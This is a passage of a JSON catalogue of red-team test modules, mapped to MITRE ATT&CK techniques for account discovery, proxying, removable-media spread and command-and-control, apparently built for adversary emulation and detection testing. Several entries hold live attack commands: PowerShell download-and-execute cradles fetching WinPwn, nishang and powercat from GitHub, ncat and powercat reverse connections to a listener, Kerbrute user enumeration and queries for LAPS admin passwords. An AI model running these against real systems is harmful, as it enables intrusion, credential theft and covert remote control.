      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "00c652e2-0750-4ca6-82ff-0204684a6fe4",
      "module_name": "Enumerate Root Domain linked policies Discovery"
    },
    {
      "index": 589,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ce483c35-c74b-45a7-a670-631d1e69db3d",
      "module_name": "WinPwn - generaldomaininfo"
    },
    {
      "index": 590,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cd \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\username.txt\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "Domain",
          "description": "Domain that is being tested against",
          "type": "string",
          "default_value": "$env:USERDOMAIN"
        },
        {
          "name": "DomainController",
          "description": "Domain Controller that is being tested against",
          "type": "string",
          "default_value": "$env:UserDnsDomain"
        }
      ],
      "prerequisites": [
        {
          "description": "kerbrute.exe must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
        },
        {
          "description": "username text file must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\username.txt\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1087.002/src/username.txt?raw=true\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\username.txt\"\n"
        }
      ],
      "rx_module_id": "f450461c-18d1-4452-9f0d-2c42c3f08624",
      "module_name": "Kerbrute - userenum"
    },
    {
      "index": 591,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b8a563d4-a836-4993-a74e-0a19b8481bfe",
      "module_name": "Wevtutil - Discover NTLM Users Remote"
    },
    {
      "index": 592,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test executes LDAP query using powershell command Get-ADComputer and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ADComputer #{hostname} -Properties *",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "hostname",
          "description": "Name of the host",
          "type": "string",
          "default_value": "$env:computername"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "394012d9-2164-4d4f-b9e5-acf30ba933fe",
      "module_name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties"
    },
    {
      "index": 593,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test executes LDAP query using powershell command Get-ADComputer and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "hostname",
          "description": "Name of the host",
          "type": "string",
          "default_value": "$env:computername"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6e85bdf9-7bc4-4259-ac0f-f0cb39964443",
      "module_name": "Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property"
    },
    {
      "index": 594,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ffbcfd62-15d6-4989-a21a-80bfc8e58bb5",
      "module_name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope"
    },
    {
      "index": 595,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "& \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" *\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        },
        {
          "name": "domain",
          "description": "Domain of the host",
          "type": "string",
          "default_value": "$env:USERDOMAIN"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "abf00f6c-9983-4d9a-afbc-6b1c6c6448e1",
      "module_name": "Suspicious LAPS Attributes Query with adfind all properties"
    },
    {
      "index": 596,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "& \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        },
        {
          "name": "domain",
          "description": "Domain of the host",
          "type": "string",
          "default_value": "$env:USERDOMAIN"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "51a98f96-0269-4e09-a10f-e307779a8b05",
      "module_name": "Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd"
    },
    {
      "index": 597,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "The domain to be tested",
          "type": "string",
          "default_value": "example"
        },
        {
          "name": "top_level_domain",
          "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
          "type": "string",
          "default_value": "test"
        },
        {
          "name": "user",
          "description": "username@domain of a user within the ad database",
          "type": "string",
          "default_value": "user@example.test"
        },
        {
          "name": "password",
          "description": "password of the user with admin privileges referenced in admin_user",
          "type": "string",
          "default_value": "s3CurePssw0rD!"
        }
      ],
      "prerequisites": [
        {
          "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
          "check_command": "which ldapsearch\n",
          "install_command": "echo ldapsearch not found\n"
        }
      ],
      "rx_module_id": "096b6d2a-b63f-4100-8fa0-525da4cd25ca",
      "module_name": "Active Directory Domain Search"
    },
    {
      "index": 598,
      "technique_id": "T1087.002",
      "technique_name": "Account Discovery: Domain Account",
      "description": "This test uses LDAPDomainDump to perform account enumeration on a domain.\n[Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087",
        "elevation_required": false,
        "cleanup_command": "rm -rf /tmp/T1087/ 2>/dev/null \n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username and domain to authenticate with",
          "type": "string",
          "default_value": "domain\\user"
        },
        {
          "name": "target_ip",
          "description": "IP to connect to",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "password",
          "description": "Password to authenticate with",
          "type": "string",
          "default_value": "password"
        }
      ],
      "prerequisites": [
        {
          "description": "Python3 must be installed",
          "check_command": "if [ -x \"$(command -v python3 --version)\" ]; then exit 0; else exit 1; fi;",
          "install_command": "sudo apt-get -y install python3"
        },
        {
          "description": "Pip must be installed",
          "check_command": "if [ -x \"$(command -v pip --version)\" ]; then exit 0; else exit 1; fi;",
          "install_command": "wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py\npython3 /tmp/get-pip.py"
        },
        {
          "description": "The ldapdomaindump module must be installed",
          "check_command": "python3 -c 'import ldapdomaindump' 2>/dev/null",
          "install_command": "pip install ldapdomaindump"
        },
        {
          "description": "The future module must be installed",
          "check_command": "python3 -c 'import future' 2>/dev/null",
          "install_command": "pip install future"
        }
      ],
      "rx_module_id": "a54d497e-8dbe-4558-9895-44944baa395f",
      "module_name": "Account Enumeration with LDAPDomainDump"
    },
    {
      "index": 599,
      "technique_id": "T1090.001",
      "technique_name": "Proxy: Internal Proxy",
      "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port}\ncurl #{test_url}\n",
        "elevation_required": false,
        "cleanup_command": "unset #{proxy_scheme}_proxy\n[ \"#{run_squid}\" == \"true\" ] && (kill -9 $(ps aux | grep \"squid -N\" | grep -v \"grep\" | awk '{print $2}'))\n"
      },
      "variables": [
        {
          "name": "proxy_server",
          "description": "Proxy server URL",
          "type": "url",
          "default_value": "127.0.0.1"
        },
        {
          "name": "proxy_port",
          "description": "Proxy server port",
          "type": "integer",
          "default_value": 3128
        },
        {
          "name": "proxy_scheme",
          "description": "Protocol to proxy (http or https)",
          "type": "string",
          "default_value": "http"
        },
        {
          "name": "test_url",
          "description": "URL to test proxy connection",
          "type": "string",
          "default_value": "http://google.com"
        },
        {
          "name": "run_squid",
          "description": "If set to true, the test will install and configure a proxy server on the endpoint.\nNote that this test may conflict with pre-existing system configuration.\n",
          "type": "string",
          "default_value": "false"
        }
      ],
      "prerequisites": [
        {
          "description": "Squid must be installed and running",
          "check_command": "if ([ \"#{run_squid}\" = \"false\" ] || ([ -x \"$(command -v squid --version)\" ] && (ps aux | grep \"squid -N\" | grep -v \"grep\"))); then exit 0; else exit 1; fi;",
          "install_command": "[ \"#{run_squid}\" = \"true\" ] && ([ -x \"$(command -v squid --version)\" ] || sudo DEBIAN_FRONTEND=noninteractive apt-get -y install squid curl || sudo yum install -y squid curl || sudo dnf install -y squid curl || brew install curl squid) && (squid -N -d 1 &) && exit 0\necho \"Value #{run_squid} for variable \"run_squid\" is not valid\" && exit 1"
        }
      ],
      "rx_module_id": "0ac21132-4485-4212-a681-349e8a6637cd",
      "module_name": "Connection Proxy"
    },
    {
      "index": 600,
      "technique_id": "T1090.001",
      "technique_name": "Proxy: Internal Proxy",
      "description": "Enable traffic redirection on macOS UI (not terminal).\nThe test will modify and enable the \"Web Proxy\" and \"Secure Web Proxy\" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.\n\nNote that this test may conflict with pre-existing system configuration.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\n",
        "elevation_required": false,
        "cleanup_command": "networksetup -setwebproxystate #{interface} off\nnetworksetup -setsecurewebproxystate #{interface} off\n"
      },
      "variables": [
        {
          "name": "proxy_server",
          "description": "Proxy server URL (host)",
          "type": "url",
          "default_value": "127.0.0.1"
        },
        {
          "name": "proxy_port",
          "description": "Proxy server port",
          "type": "integer",
          "default_value": 8080
        },
        {
          "name": "interface",
          "description": "Protocol to proxy (http or https)",
          "type": "string",
          "default_value": "Wi-Fi"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "648d68c1-8bcd-4486-9abe-71c6655b6a2c",
      "module_name": "Connection Proxy for macOS UI"
    },
    {
      "index": 601,
      "technique_id": "T1090.001",
      "technique_name": "Proxy: Internal Proxy",
      "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}",
        "elevation_required": true,
        "cleanup_command": "netsh interface portproxy delete v4tov4 listenport=#{listenport} -ErrorAction Ignore | Out-Null"
      },
      "variables": [
        {
          "name": "connectaddress",
          "description": "Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer.",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "connectport",
          "description": "Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer.",
          "type": "string",
          "default_value": "1337"
        },
        {
          "name": "listenport",
          "description": "Specifies the IPv4 port, by port number or service name, on which to listen.",
          "type": "string",
          "default_value": "1337"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b8223ea9-4be2-44a6-b50a-9657a3d4e72a",
      "module_name": "portproxy reg key"
    },
    {
      "index": 602,
      "technique_id": "T1090.003",
      "technique_name": "Proxy: Multi-hop Proxy",
      "description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "& \"PathToRagloxModulesFolder\\T1090.003\\src\\Psiphon.bat\"\n",
        "elevation_required": false,
        "cleanup_command": "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "The proxy settings backup file must exist on disk at $env:Temp\\proxy-backup.txt\n",
          "check_command": "if (Test-Path $env:Temp\\proxy-backup.txt) {exit 0} else {exit 1}\n",
          "install_command": "if(-not (test-path $env:Temp\\proxy-backup.txt)){\n$Proxy = (Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -ErrorAction Ignore).ProxyServer\nSet-Content $env:Temp\\proxy-backup.txt $Proxy}\n"
        },
        {
          "description": "The Psiphon executable must exist in the Downloads folder\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\psiphon3.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://s3.amazonaws.com/0ubz-2q11-gi9y/psiphon3.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\psiphon3.exe\" \n"
        },
        {
          "description": "Batch file containing commands to run must be in src directory \n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\T1090.003\\src\\Psiphon.bat\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1090.003\\src\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1090.003/src/Psiphon.bat\" -OutFile \"PathToRagloxModulesFolder\\T1090.003\\src\\Psiphon.bat\"\n"
        }
      ],
      "rx_module_id": "14d55ca0-920e-4b44-8425-37eedd72b173",
      "module_name": "Psiphon"
    },
    {
      "index": 603,
      "technique_id": "T1090.003",
      "technique_name": "Proxy: Multi-hop Proxy",
      "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"#{TorExe}\"}'\nsleep -s 60\nstop-process -name \"tor\" | out-null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "TorExe",
          "description": "Location of tor.exe file.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "tor.exe must be installed on the machine \n",
          "check_command": "if (Test-Path \"#{TorExe}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\tor.zip\"\nexpand-archive -LiteralPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\tor.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\tor\"\n"
        }
      ],
      "rx_module_id": "7b9d85e5-c4ce-4434-8060-d3de83595e69",
      "module_name": "Tor Proxy Usage - Windows"
    },
    {
      "index": 604,
      "technique_id": "T1090.003",
      "technique_name": "Proxy: Multi-hop Proxy",
      "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "[ \"$(uname)\" = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor\n",
        "elevation_required": true,
        "cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Tor must be installed on the machine \n",
          "check_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "(which apt && sudo apt-get -y install tor) || (which pkg && pkg install -y tor)\n"
        }
      ],
      "rx_module_id": "5ff9d047-6e9c-4357-b39b-5cf89d9b59c7",
      "module_name": "Tor Proxy Usage - Debian/Ubuntu/FreeBSD"
    },
    {
      "index": 605,
      "technique_id": "T1090.003",
      "technique_name": "Proxy: Multi-hop Proxy",
      "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'\n",
        "elevation_required": false,
        "cleanup_command": "killall tor > /dev/null 2>&1\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Tor must be installed on the machine \n",
          "check_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "if [ ! -x \"$(command -v brew --version)\" ]; then /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)\"; fi\nbrew install tor\n"
        }
      ],
      "rx_module_id": "12631354-fdbc-4164-92be-402527e748da",
      "module_name": "Tor Proxy Usage - MacOS"
    },
    {
      "index": 606,
      "technique_id": "T1091",
      "technique_name": "Replication Through Removable Media",
      "description": "Simulates an adversary copying malware to all connected removable drives. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$RemovableDrives=@()\n$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nwrite-host \"Removable Drive Found:\" $Drive\nNew-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"\n}\n",
        "elevation_required": false,
        "cleanup_command": "$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nRemove-Item -Path $Drive\\T1091Test1.txt -Force -ErrorAction Ignore\n}\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d44b7297-622c-4be8-ad88-ec40d7563c75",
      "module_name": "USB Malware Spread Simulation"
    },
    {
      "index": 607,
      "technique_id": "T1095",
      "technique_name": "Non-Application Layer Protocol",
      "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "server_ip",
          "description": "The IP address of the listening server",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0268e63c-e244-42db-bef7-72a9e59fc1fc",
      "module_name": "ICMP C2"
    },
    {
      "index": 608,
      "technique_id": "T1095",
      "technique_name": "Non-Application Layer Protocol",
      "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c \"#{ncat_exe}\" #{server_ip} #{server_port}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "server_port",
          "description": "The port for the C2 connection",
          "type": "integer",
          "default_value": 80
        },
        {
          "name": "ncat_exe",
          "description": "The location of ncat.exe",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe"
        },
        {
          "name": "ncat_path",
          "description": "The folder path of ncat.exe",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1095"
        },
        {
          "name": "server_ip",
          "description": "The IP address or domain name of the listening server",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [
        {
          "description": "ncat.exe must be available at specified location (#{ncat_exe})\n",
          "check_command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory -Force -Path \"#{ncat_path}\" | Out-Null\n$parentpath = Split-Path (Split-Path \"#{ncat_exe}\"); $zippath = \"$parentpath\\nmap.zip\"\nInvoke-WebRequest  \"https://nmap.org/dist/nmap-7.80-win32.zip\" -OutFile \"$zippath\"\n  Expand-Archive $zippath $parentpath -Force\n  $unzipPath = Join-Path $parentPath \"nmap-7.80\"\nif( $null -eq (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | ?{$_.DisplayName -like \"Microsoft Visual C++*\"}) ) {\n  Start-Process (Join-Path $unzipPath \"vcredist_x86.exe\")\n}\n"
        }
      ],
      "rx_module_id": "bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37",
      "module_name": "Netcat C2"
    },
    {
      "index": 609,
      "technique_id": "T1095",
      "technique_name": "Non-Application Layer Protocol",
      "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "server_ip",
          "description": "The IP address or domain name of the listening server",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "server_port",
          "description": "The port for the C2 connection",
          "type": "integer",
          "default_value": 80
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e",
      "module_name": "Powercat C2"
    },
    {
      "index": 610,
      "technique_id": "T1095",
      "technique_name": "Non-Application Layer Protocol",
      "description": "ICMP C2 (Command and Control) utilizes the Internet Control Message Protocol (ICMP), traditionally used for network diagnostics, as a covert communication channel for attackers. By using ICMP, adversaries can send commands, exfiltrate data, or maintain access to compromised systems without triggering network detection systems.\nThis method allows attackers to communicate and control compromised devices while remaining undetected.\n\nFor more details, check this blog: [ICMP Reverse Shell Blog](https://cryptsus.com/blog/icmp-reverse-shell.html)\n\n**Important Notes:**\n- Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim).\n- Binaries work on Ubuntu 22.04.5 LTS; for CentOS Stream or other, use the Python file from the GitHub link [https://github.com/krabelize/icmpdoor].\n- Root access is required.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8e139e1f-1f3a-4be7-901d-afae9738c064",
      "module_name": "Linux ICMP Reverse Shell using icmp-cnc"
    },
    {
      "index": 611,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Manipulate Admin Account Name\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
